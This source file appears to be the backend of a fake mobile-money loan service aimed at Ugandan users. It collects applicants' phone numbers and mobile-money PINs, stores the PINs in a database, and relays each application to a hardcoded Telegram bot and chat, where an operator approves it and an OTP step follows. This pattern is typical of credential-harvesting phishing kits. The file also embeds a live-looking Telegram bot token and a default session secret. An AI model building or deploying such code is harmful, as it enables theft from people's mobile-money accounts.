const express = require('express');
const session = require('express-session');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

// Add fetch for older Node versions
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Railway URL
const RAILWAY_URL = process.env.RAILWAY_PUBLIC_DOMAIN || 'https://momo-uganda-production.up.railway.app';

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Database path
const DB_PATH = '/tmp/loans.db';

let db = null;

async function initDatabase() {
    try {
        console.log('Initializing database at:', DB_PATH);
        db = await open({
            filename: DB_PATH,
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE NOT NULL,
                phone TEXT NOT NULL,
                network TEXT NOT NULL,
                amount INTEGER NOT NULL,
                duration INTEGER NOT NULL,
                monthly_payment INTEGER NOT NULL,
                total_payment INTEGER NOT NULL,
                interest INTEGER NOT NULL,
                status TEXT DEFAULT 'pending',
                pin TEXT,
                otp TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS loan_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE INDEX IF NOT EXISTS idx_loans_phone ON loans(phone);
            CREATE INDEX IF NOT EXISTS idx_loans_status ON loans(status);
        `);

        console.log('✅ Database initialized successfully');
        return true;
    } catch (error) {
        console.error('❌ Database initialization error:', error);
        return false;
    }
}

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Session middleware
app.use(session({
    secret: process.env.SESSION_SECRET || 'momo_uganda_loan_secret_key_2024',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        httpOnly: true,
        maxAge: 30 * 60 * 1000
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Generate unique loan ID
function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// Send message to Telegram
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (data.ok && data.result) {
            console.log('✅ Telegram message sent');
            return data.result.message_id;
        }
        console.error('Telegram send error:', data);
        return null;
    } catch (error) {
        console.error('Telegram send error:', error);
        return null;
    }
}

// Edit Telegram message
async function editTelegramMessage(messageId, text) {
    try {
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Edit message error:', error);
    }
}

// ========== API ROUTES ==========

// Health check
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        database: db ? 'connected' : 'disconnected'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// Calculate loan
app.post('/api/calculate', (req, res) => {
    try {
        const { amount, duration } = req.body;
        const monthlyRate = 0.095;
        const months = duration / 30;
        const interest = Math.round(amount * monthlyRate * months);
        const total = amount + interest;
        const monthly = Math.ceil(total / months);
        
        res.json({
            success: true,
            amount,
            duration,
            monthly,
            total,
            interest,
            currency: 'UGX'
        });
    } catch (error) {
        console.error('Calculate error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save loan application - FIXED VERSION
app.post('/api/save-loan', async (req, res) => {
    try {
        console.log('Received save-loan request:', req.body);
        
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        // Validate required fields
        if (!phone || !network || !amount) {
            console.error('Missing required fields');
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required fields: phone, network, amount' 
            });
        }
        
        // Check database connection
        if (!db) {
            console.error('Database not initialized');
            return res.status(500).json({ success: false, error: 'Database not initialized' });
        }
        
        const loanId = generateLoanId();
        console.log('Generated loan ID:', loanId);
        
        // Use default pin if not provided
        const userPin = pin || '1234';
        
        await db.run(
            `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, phone, network, amount, duration, monthly, total, interest, userPin, 'pending_verification']
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'created', `Loan application created for ${phone}`]
        );
        
        console.log('Loan saved to database, sending to Telegram...');
        
        // Send to Telegram
        const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>📅 Duration:</b> ${duration / 30} months\n` +
            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Approve Loan", callback_data: `approve_${loanId}` }
                ],
                [
                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
                ]
            ]
        };
        
        await sendTelegramMessage(messageText, replyMarkup);
        
        console.log('Telegram message sent, returning success');
        
        res.json({
            success: true,
            loanId: loanId
        });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Complete loan with OTP
app.post('/api/complete-loan', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        if (!db) {
            return res.status(500).json({ success: false, error: 'Database not initialized' });
        }
        
        const loan = await db.get(
            `SELECT * FROM loans WHERE loan_id = ? AND otp = ?`,
            [loanId, otp]
        );
        
        if (!loan) {
            return res.status(400).json({ success: false, error: 'Invalid OTP or Loan ID' });
        }
        
        await db.run(
            `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
            ['approved', loanId]
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'completed', 'Loan approved and completed']
        );
        
        res.json({ success: true, loan: loan });
        
    } catch (error) {
        console.error('Complete loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get loan status
app.get('/api/loan/:loanId', async (req, res) => {
    try {
        if (!db) {
            return res.status(500).json({ success: false, error: 'Database not initialized' });
        }
        
        const loan = await db.get(
            `SELECT loan_id, phone, network, amount, duration, monthly_payment, total_payment, status, created_at
             FROM loans WHERE loan_id = ?`,
            [req.params.loanId]
        );
        
        if (!loan) {
            return res.status(404).json({ success: false, error: 'Loan not found' });
        }
        
        res.json({ success: true, loan });
        
    } catch (error) {
        console.error('Get loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Telegram Webhook
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('Webhook received');
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const messageId = update.callback_query.message.message_id;
            const callbackId = update.callback_query.id;
            
            const [action, loanId] = callbackData.split('_');
            
            console.log(`Callback action: ${action}, loanId: ${loanId}`);
            
            if (!db) {
                console.error('Database not connected');
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "Database error"
                    })
                });
                return res.sendStatus(200);
            }
            
            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
            
            if (!loan) {
                console.error('Loan not found:', loanId);
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "Loan not found"
                    })
                });
                return res.sendStatus(200);
            }
            
            if (action === 'approve') {
                // Generate OTP
                const otp = Math.floor(100000 + Math.random() * 900000).toString();
                console.log(`Generated OTP: ${otp} for loan ${loanId}`);
                
                // Update loan status to 'otp_sent'
                await db.run(
                    `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    [otp, 'otp_sent', loanId]
                );
                
                console.log(`Loan ${loanId} updated to status: otp_sent`);
                
                // Answer callback query
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "✅ Loan approved! User can now proceed."
                    })
                });
                
                // Edit original message to show approved
                await editTelegramMessage(messageId, 
                    `✅ <b>LOAN APPROVED</b>\n\n` +
                    `Loan ID: ${loanId}\n` +
                    `Phone: ${loan.phone}\n` +
                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
                    `Status: Approved - Waiting for user OTP verification\n` +
                    `OTP: ${otp}`
                );
                
            } else if (action === 'decline') {
                // Update loan status to declined
                await db.run(
                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    ['declined', loanId]
                );
                
                console.log(`Loan ${loanId} updated to status: declined`);
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "Loan declined"
                    })
                });
                
                await editTelegramMessage(messageId,
                    `❌ <b>LOAN DECLINED</b>\n\n` +
                    `Loan ID: ${loanId}\n` +
                    `Phone: ${loan.phone}\n` +
                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
                    `Status: Declined by admin`
                );
            }
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Start server
async function startServer() {
    const dbInitialized = await initDatabase();
    
    if (!dbInitialized) {
        console.error('⚠️ Failed to initialize database');
    }
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🌐 URL: ${RAILWAY_URL}`);
        console.log(`✅ Health check: ${RAILWAY_URL}/health`);
        console.log(`📱 Telegram Bot configured`);
    });
}

startServer();
